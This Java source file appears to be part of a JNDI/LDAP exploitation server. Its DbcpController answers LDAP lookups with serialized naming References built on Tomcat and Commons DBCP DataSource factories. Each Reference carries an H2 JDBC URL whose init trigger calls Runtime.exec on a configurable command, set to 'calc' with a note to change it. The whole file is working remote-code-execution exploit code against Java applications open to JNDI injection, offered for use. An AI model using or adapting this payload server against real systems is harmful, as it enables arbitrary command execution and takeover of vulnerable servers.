package com.feihong.ldap.controllers;

import com.feihong.ldap.enumtypes.PayloadType;
import com.feihong.ldap.exceptions.IncorrectParamsException;
import com.feihong.ldap.exceptions.UnSupportedPayloadTypeException;
import com.feihong.ldap.utils.Util;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.Reference;
import javax.naming.StringRefAddr;


// ref: https://tttang.com/archive/1405/
@LdapMapping(uri = { "/dbcp" })
public class DbcpController implements LdapController{
    private PayloadType type;
    private String[] params;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println("[+] Sending LDAP ResourceRef result for " + base);

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String");

//        ResourceRef ref = new ResourceRef("javax.swing.JEditorPane",
//                null, "", "", true,
//                "org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory", null);
//        ref.add(new StringRefAddr("page", params[0]));
        javax.naming.Reference ref = null;

        switch (params[0]){
            case "tomcat_jdbc":
                ref = tomcat_JDBC_RCE();
                break;
            case "tomcat_dbcp2":
                ref = tomcat_dbcp2_RCE();
                break;
            case "tomcat_dbcp1":
                ref = tomcat_dbcp1_RCE();
                break;
            case "commons_dbcp2":
                ref = commons_dbcp2_RCE();
                break;
            case "commons_dbcp1":
                ref = commons_dbcp1_RCE();
                break;

        }


        e.addAttribute("javaSerializedData", Util.serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));

        System.out.println("[+] Done Sending LDAP ResourceRef result");
    }

    private static Reference tomcat_JDBC_RCE(){
        return dbcpByFactory("org.apache.tomcat.jdbc.pool.DataSourceFactory");
    }

    private static Reference tomcat_dbcp2_RCE(){
        return dbcpByFactory("org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory");
    }
    private static Reference tomcat_dbcp1_RCE(){
        return dbcpByFactory("org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory");
    }
    private static Reference commons_dbcp2_RCE(){
        return dbcpByFactory("org.apache.commons.dbcp2.BasicDataSourceFactory");
    }
    private static Reference commons_dbcp1_RCE(){
        return dbcpByFactory("org.apache.commons.dbcp.BasicDataSourceFactory");
    }


    private static Reference dbcpByFactory(String factory){
        String cmd = "calc";  // 修改这里

        Reference ref = new Reference("javax.sql.DataSource",factory,null);
        String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
                "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                "java.lang.Runtime.getRuntime().exec('" + cmd +  "')\n" +
                "$$\n";
        ref.add(new StringRefAddr("driverClassName","org.h2.Driver"));
        ref.add(new StringRefAddr("url",JDBC_URL));
        ref.add(new StringRefAddr("username","root"));
        ref.add(new StringRefAddr("password","password"));
        ref.add(new StringRefAddr("initialSize","1"));
        return ref;
    }



    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        try{
            int firstIndex = base.indexOf("/");
            int secondIndex = base.indexOf("/", firstIndex + 1);
            if(secondIndex < 0) secondIndex = base.length();

            try{
                type = PayloadType.valueOf(base.substring(firstIndex + 1, secondIndex).toLowerCase());

                // 只支持这一种
                if(type != PayloadType.factory){
                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + type);
                }

                System.out.println("[+] Paylaod: " + type);
            }catch(IllegalArgumentException e){
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(firstIndex + 1, secondIndex));
            }

            switch (type){
                case factory:
                    String factory = Util.getFactoryFromBase(base);
                    System.out.println("[+] Propertiy url: " + factory);
                    params = new String[]{factory};    // 设置好url，待sendResult方法内使用
                    break;
            }
        }catch(Exception e){
            if(e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException)e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }
}
